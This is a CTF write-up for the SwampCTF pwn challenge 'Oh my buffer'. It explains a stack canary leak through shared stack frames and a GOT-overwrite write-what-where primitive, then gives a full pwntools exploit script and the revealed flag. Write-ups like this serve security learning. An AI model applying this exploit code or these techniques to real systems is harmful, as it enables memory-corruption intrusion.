https://ctftime.org/event/2573

# Oh my buffer (pwn)

I may have messed up my I/O calls, but it doesn't matter if everything sensitive has been erased, right?

nc chals.swampctf.com 40005

## Analysis

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

`main` @ `0x4013c3`:

- Writes the flag to `/dev/null`
- Calls `fork`
- The `fork` child implements a menu that can call either `reg` or `login`

`reg` @ `0x401256`:

- Calls `read(STDIN_FILENO, local_28, 0x0a)`
- Calls `read(STDIN_FILENO, local_28, 0x2a)`
    - Note this can write over the canary and can control up to 2 bytes of the return address on the stack

`login` @ `004012fb`:

- Calls `scanf(stdin, "%d", local_2c)`
- Calls `read(STDIN_FILENO, local_28, 0x10)`
- Calls `write(STDOUT_FILENO, local_28, local_2c)`
    - This lets us control the the length of the write somewhat via the call to `scanf`

Note: `reg` and `login` share the same virtual memory for their stack frames and so the longer `read` in `reg` can be written to `STDOUT_FILENO` via the `write` in `login` even though the `read` in `login` is much shorter.

### Leaking the Canary

By exploiting the fact that `reg` and `login` share virtual memory for their stack frames we can do a long write in `reg` followed by a long read in `login` that ends with the stack canary's value as follows:

```python
def canary():
    register(b"A" * 0x18) 
    leak = login(b"A" * 0x10, 0x20)
    return u64(leak[-8:])
```

### Building a Write What Where

The approach that I chose to take, which I don't think was the intended one based on the flag, is manipulate entries in the `.got`.

We can see from the following diassembly that the value of `rbp` directly controls the value of `rsi` and that we only have to write a value that is 0x20 larger than the value we intended to be in `rsi`:

```asm
004012b5 48 8d 45 e0     LEA        RAX=>buffer,[RBP + -0x20]
004012b9 ba 2a 00        MOV        EDX,0x2a
         00 00
004012be 48 89 c6        MOV        RSI,RAX
004012c1 bf 00 00        MOV        EDI,0x0
         00 00
004012c6 e8 15 fe        CALL       <EXTERNAL>::read
         ff ff
```

Note that we can only 2 bytes of address we intended to return to, i.e. `0x4012b5 & 0xffff`, because our payload must be no greater than 0x2a bytes.

Finally we must then send to `STDIN_FILENO` what we want to write:

```python
READ_WRITE = 0x004012b5

def write_what_where(what, where):
    payload = b"A" * 0x18
    payload += p64(canary())
    payload += p64(where + 0x20) # rbp
    payload += p16(READ_WRITE & 0xffff)
    register(payload)
    p.send(what)
```

Note that when we attempt to return from `reg` after jumping to `0x004012b5` we won't have a proper stack frame nor a stack canary and so a call to `__stack_chk_fail` will occur. This means that in order for our `write_what_where` to be usable our first write to should be to the `.got` entry for `__stack_chk_fail` with the value of `main`.

Now we have everything we need to perform arbitrary writes.

## Solution

1) Leak the stack canary by doing a 0x18 byte write in `register` and then a 0x20 byte read in `login`
2) Write the address of `main` to the `.got` entry for `__stack_chk_fail`
    - This turns calls to `__stack_chk_fail` into a ret2main
3) Write the address of a `ret` instruction to the got entry for `dup2`
    - This prevents the call to `dup2` from doing anything and therefore allows the flag to be written to `stdout` rather than `/dev/null` when we ret2main

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./binary", checksec=False)
context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals.swampctf.com", 40005)

def register(buf):
    p.sendlineafter(b"3) Exit\n", str(1).encode())
    assert(len(buf) <= 0x2a)
    p.sendafter(b"Username: ", buf)
    p.sendafter(b"Password: ", buf)
    p.readuntil(b"open right now!\n")

def login(buf, length):
    p.sendlineafter(b"3) Exit\n", str(2).encode())
    p.sendlineafter(b"How long is your username: ", str(length).encode())
    assert(len(buf) <= 0x10)
    p.sendafter(b"Username: ", buf)
    p.readuntil(b"find the user: ")
    return p.recv(length)

def canary():
    register(b"A" * 0x18) 
    leak = login(b"A" * 0x10, 0x20)
    return u64(leak[-8:])

READ_WRITE = 0x004012b5

def write_what_where(what, where):
    payload = b"A" * 0x18
    payload += p64(canary())
    payload += p64(where + 0x20) # rbp
    payload += p16(READ_WRITE & 0xffff)
    register(payload)
    p.send(what)

RET_GADGET = 0x00401648

# use __stack_chk_fail to ret2main
write_what_where(what=p64(elf.sym["main"]), where=elf.got["__stack_chk_fail"])

# turn calls to dup2 into a nop
write_what_where(what=p64(RET_GADGET), where=elf.got["dup2"])

p.readuntil(b"swampCTF{")
print("swampCTF{" + p.readuntil(b"}").decode()) # swampCTF{fUn_w1tH_f0rk5_aN6_fd5}
```

## Flag
`swampCTF{fUn_w1tH_f0rk5_aN6_fd5}`

smiley 2025/03/29
